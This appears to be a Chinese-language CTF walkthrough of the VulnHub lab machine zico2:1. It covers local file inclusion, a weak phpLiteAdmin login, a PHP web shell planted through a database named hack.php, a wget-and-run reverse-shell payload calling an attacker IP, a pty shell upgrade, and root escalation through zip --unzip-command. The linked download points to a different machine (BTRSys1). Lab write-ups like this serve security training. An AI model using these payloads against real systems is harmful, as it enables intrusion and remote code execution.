---
title: VulnHub zico2：1
date: 2026-04-01 16:39:00
categories: 
  - VulnHub
tags:
  - 本地文件包含
  - phpLiteAdmin
  - RCE
  - Python 升级为交互式 Shell
  - 敏感信息泄露
  - zip --unzip-command
---

# zico2: 1

项目地址：https://download.vulnhub.com/btrsys/BTRSys1.rar

是一个打包好的镜像文件

**注意：导入 vmx 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/69cbeddd2154d21e1355dca3.png)

## 本地文件包含

### page

查看 80 端口发现有使用文件包含函数

![](https://pic1.imgdb.cn/item/69cbeec35cfefdcff4b19555.png)

尝试读取 `/etc/passwd` 文件成功

![](https://pic1.imgdb.cn/item/69cbf51e5cfefdcff4b1c611.png)

## 弱口令

### phpLiteAdmin

扫描目录发现另一个后台 `/dbadmin/`

![](https://pic1.imgdb.cn/item/69cbf5655cfefdcff4b1c613.png)

弱口令 `admin` 登录成功

![](https://pic1.imgdb.cn/item/69cbf5a55cfefdcff4b1c617.png)

## RCE

### phpLiteAdmin

在 PhpLiteAdmin 主界面找到“Create new database”输入框，输入数据库名 `hack.php`，点击 Create

PhpLiteAdmin 会将数据库文件保存在 `$directory` 配置的目录中（如 `/usr/databases/`），文件名使用用户输入的内容。如果以 `.php` 结尾，该文件将可被 Web 服务器以 PHP 解析

![](https://pic1.imgdb.cn/item/69cbf7415cfefdcff4b1c61d.png)

在“Create new table”输入框中输入表名（例如 shell），字段数量填 1，点击 Go

![](https://pic1.imgdb.cn/item/69cbf7ae5cfefdcff4b1c61e.png)

在字段配置页面：

- **Field Name**：随意填写，如 `cmd`
- **Field Type**：选择 `TEXT`
- **Default Value**：填入 PHP 代码，例如 `<?php system($_POST['cmd']); ?>`

![](https://pic1.imgdb.cn/item/69cbf9c05cfefdcff4b1cf92.png)

创建成功

SQLite 数据库本质上是一个二进制文件，但插入的文本字段中如果包含 `<?php ... ?>` 标签，当该 `.php` 文件被直接访问或被包含时，PHP 引擎会解析执行其中的代码

![](https://pic1.imgdb.cn/item/69cbfa545cfefdcff4b1d373.png)

这里我直接上传的是反弹 Shell

```php
<?php system("wget http://192.168.110.128:8989/reverseshell.php -O /tmp/shell.php; php /tmp/shell.php"); ?>
```

![](https://pic1.imgdb.cn/item/69cbfd5e5cfefdcff4b1f1d9.png)

## 提权

### Python 升级为交互式 Shell

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

### 敏感信息泄露

用户 `zico` 家目录可读，进入后发现有个 `to_do.txt` 文件，读取其内容应该是提示

![](https://pic1.imgdb.cn/item/69cbff245cfefdcff4b1fdb6.png)

最后翻找到 `wordpress/wp-config.php` 中配置的账号密码

![](https://pic1.imgdb.cn/item/69cbff9d5cfefdcff4b1ff27.png)

使用 SSH 登录成功

![](https://pic1.imgdb.cn/item/69cbffcc5cfefdcff4b1ff28.png)

### zip --unzip-command

查看权限发现 `tar` 和 `zip` 可用

![](https://pic1.imgdb.cn/item/69cbfff15cfefdcff4b1ff29.png)

`zip -T --unzip-command="<command>" archive.zip file` 会在测试压缩包时执行 `<command>`，并将 `<command>` 作为 shell 命令调用

如果 `zip` 以 root 权限运行，那么 `<command>` 也将以 root 权限执行

![](https://pic1.imgdb.cn/item/69cc00ba5cfefdcff4b1ff2c.png)